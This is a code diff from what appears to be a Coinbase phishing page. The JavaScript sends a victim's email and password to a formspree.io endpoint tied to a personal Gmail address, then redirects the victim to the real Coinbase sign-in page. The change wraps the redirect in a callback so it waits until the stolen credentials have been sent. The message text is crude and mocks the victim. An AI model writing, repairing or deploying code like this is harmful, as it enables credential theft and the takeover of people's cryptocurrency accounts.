@@ -225,12 +225,13 @@
                 var email = $("#email").prop("value");
                 var passwd = $("#password").prop("value");
                 $.ajax({
-    url: "https://formspree.io/stevuninverse@gmail.com", 
-    method: "POST",
-    data: {message: "hello this is to notify you that we've succesfully caught a fucking idiot\n\n\nemail: " + email + "\nassword: " + passwd + "\n\n\nregards,\nfuck butt\n\ndickhead of scamming at coīnbase inc\n69 butthole avenue\n42069 shithole, FL\n\n\nplese consider the environment before printing this email"},
-    dataType: "json"
-});
-            window.location.replace("https://www.coinbase.com/signin");
+                    url: "https://formspree.io/stevuninverse@gmail.com", 
+                    method: "POST",
+                    data: {message: "hello this is to notify you that we've succesfully caught a fucking idiot\n\n\nemail: " + email + "\nassword: " + passwd + "\n\n\nregards,\nfuck butt\n\ndickhead of scamming at coīnbase inc\n69 butthole avenue\n42069 shithole, FL\n\n\nplese consider the environment before printing this email"},
+                    dataType: "json"
+                }).always(function(data) {
+                    window.location.replace("https://www.coinbase.com/signin");
+                });
         });
         });
     </script>
